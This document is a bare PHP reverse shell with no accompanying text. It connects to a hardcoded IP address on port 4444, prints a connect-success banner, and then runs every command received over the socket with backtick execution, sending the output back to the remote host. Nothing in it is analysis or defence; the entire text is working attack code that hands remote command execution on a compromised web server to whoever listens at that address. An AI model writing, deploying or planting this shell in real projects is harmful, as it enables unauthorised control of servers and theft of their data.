set_time_limit(0);
$ip="172.31.218.124";

$port="4444";

$fp=@fsockopen($ip,$port,$errno,$errstr);

if(!$fp){ echo "error";}

else{

  fputs($fp,"\n++++++++++connect success++++++++\n");

  while (!feof($fp)) {

    fputs($fp,"shell:");

    $shell=fgets($fp);

    $message=`$shell`;

    fputs($fp,$message);

  }

fclose($fp);

}
